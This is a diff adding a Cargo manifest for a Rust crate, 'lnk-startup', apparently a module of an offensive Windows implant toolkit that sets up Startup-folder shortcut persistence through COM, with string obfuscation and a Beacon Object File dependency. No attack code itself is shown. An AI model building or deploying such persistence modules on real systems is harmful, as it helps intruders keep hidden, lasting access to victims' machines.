@@ -1,0 +1,17 @@
+[package]
+name = "lnk-startup"
+version.workspace = true
+edition.workspace = true
+authors.workspace = true
+license.workspace = true
+description = "Startup folder LNK persistence via IShellLinkW COM (no cmd.exe copy) — by Dani (original)."
+
+[dependencies]
+rustbof.workspace = true
+common = { path = "../../common" }
+windows-sys = { workspace = true, features = ["Win32_Foundation", "Win32_System_Com"] }
+obfstr.workspace = true
+
+[lib]
+crate-type = ["staticlib"]
+name = "lnk_startup"
